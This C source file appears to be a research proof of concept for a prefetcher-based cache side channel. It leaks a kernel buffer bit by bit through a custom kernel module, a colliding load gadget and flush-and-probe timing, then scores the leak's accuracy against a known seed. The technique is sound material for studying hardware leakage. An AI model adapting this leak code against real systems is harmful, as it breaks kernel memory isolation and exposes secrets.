#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <time.h>

#include "common.h"

// file descriptor of kernel module
static int module_fd;

// colliding load instruction
static load_gadget_f gadget;

// colliding buffer
static uint8_t* colliding_buffer;

// threshold to distinguish cache hit from cache miss
static uint64_t threshold;


uint64_t guess_byte(size_t stride, size_t offset, size_t guess_offset) {

    // flush last accessed buffer location and probe location
    flush(colliding_buffer + 2 * stride + guess_offset); 
    flush(colliding_buffer + 3 * stride + guess_offset); 
    mfence();

    // access in kernel to kernel_buffer[secret[offset]]
    ioctl(module_fd, CMD_GADGET_OFF, offset);
    mfence();
   
    // more accesses in userspace.
    // if offset is guessed correctly, this follows the stride and will prefetch.
    // otherwise, this will not prefetch.
    gadget(colliding_buffer + 1 * stride + guess_offset);
    mfence();
    gadget(colliding_buffer + 2 * stride + guess_offset);
    mfence();
    
    // fast access time -> was prefetched -> accesses followed stride -> guess was correct
    return probe(colliding_buffer + 3 * stride + guess_offset) < threshold;
}

static uint64_t get_time_nanos() {
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return t.tv_sec * 1000000000ull + t.tv_nsec;
}

static uint16_t leak_byte(size_t offset) {
    uint8_t byte = 0;
    uint8_t byte_inv = 0;
    for(int bit = 0; bit < 8; bit ++) {
        // leak a single bit
        byte |= guess_byte((rand64() % 2048) + 512, offset * 8 + bit, 1) << bit;
        byte_inv |= guess_byte((rand64() % 2048) + 512, offset * 8 + bit, 0) << bit;
    }
    return (byte_inv << 8) | byte;
}

static void analyze_leakage(uint8_t reference, uint8_t observed, uint32_t* correct, uint32_t* false_positives, uint32_t* false_negatives, uint32_t* positives, uint32_t* negatives) {
    for(uint32_t i = 0; i < 8; i++) {
        uint32_t mask = 1 << i;
        
        if(reference & mask){
            *positives += 1;
        } else {
            *negatives += 1;
        }
        
        if((reference ^ observed) & mask) {
            if(observed & mask) {
                // false positive
                *false_positives += 1;
            } else {
                // false neagative
                *false_negatives += 1;
            }
        } else {
            // correct
            *correct += 1;
        }
    }
}

int main(int argc, char** argv) {
    module_fd = open(FETCHPROBE_MODULE_DEVICE_PATH, O_RDONLY);
    if(module_fd < 0) {
        fputs("failed to open kernel module!\n", stderr);
        return -1;
    }
    
    // get required addresses from kernel
    struct fetchprobe_kernel_info info;
    ioctl(module_fd, CMD_INFO, &info);
    printf("kernel buffer: 0x%016zx\nkernel load: 0x%016zx\n", info.kernel_buffer, info.kernel_access_off);
    
    // map colliding buffer
    gadget = map_gadget(info.kernel_access_off & 0x7fffffffffffull);
    colliding_buffer = map_buffer((info.kernel_buffer & 0x7fffffffffffull) - PAGE_SIZE * 2, PAGE_SIZE * 5) + PAGE_SIZE * 2;
    printf("colliding buffer: 0x%016zx\ncolliding load: 0x%016zx\n", (uintptr_t)colliding_buffer, (uintptr_t)gadget);
    
    // calculate threshold to distinguish cache hit from cache miss
    threshold = calculate_threshold();
    printf("threshold: %zu\n", threshold);
    
    // just use timestamp as initial seed
    uint64_t shared_seed = _rdtsc();
    
    // initialize kernel buffer with pseudo random data
    ioctl(module_fd, CMD_RESET, shared_seed);
   
    // leak whole buffer
    uint16_t leakage[BUFFER_SIZE] = {0};
    mfence();
    uint64_t start = get_time_nanos();
    mfence();
    for(int offset = 0; offset < BUFFER_SIZE; offset ++) {
        leakage[offset] = leak_byte(offset);
    }
    mfence();
    uint64_t end = get_time_nanos();
    mfence();
    printf("time: %zu\n", end - start);
    
    // check how much of the leakage is correct
    seed = shared_seed;
    uint32_t correct = 0;
    uint32_t false_positives = 0;
    uint32_t false_negatives = 0;
    uint32_t positives = 0;
    uint32_t negatives = 0;
    
    uint32_t inv_correct = 0;
    uint32_t inv_false_positives = 0;
    uint32_t inv_false_negatives = 0;
    uint32_t inv_positives = 0;
    uint32_t inv_negatives = 0;
    
    for(int i = 0; i < BUFFER_SIZE; i++) {
        uint8_t ref = (uint8_t)(rand64() & 255);
        analyze_leakage(ref, (uint8_t)leakage[i], &correct, &false_positives, &false_negatives, &positives, &negatives);
        analyze_leakage(ref ^ 0xff, (uint8_t)(leakage[i] >> 8), &inv_correct, &inv_false_positives, &inv_false_negatives, &inv_positives, &inv_negatives);
    }
    
    printf("correct: %u\n", correct);
    printf("positives: %u\n", positives);
    printf("negatives: %u\n", negatives);
    printf("false positives: %u\n", false_positives);
    printf("false negatives: %u\n", false_negatives);
    
    printf("inv correct: %u\n", inv_correct);
    printf("inv positives: %u\n", inv_positives);
    printf("inv negatives: %u\n", inv_negatives);
    printf("inv false positives: %u\n", inv_false_positives);
    printf("inv false negatives: %u\n", inv_false_negatives);
    // no need to unmap, etc. OS will take care of that for us :)
}	
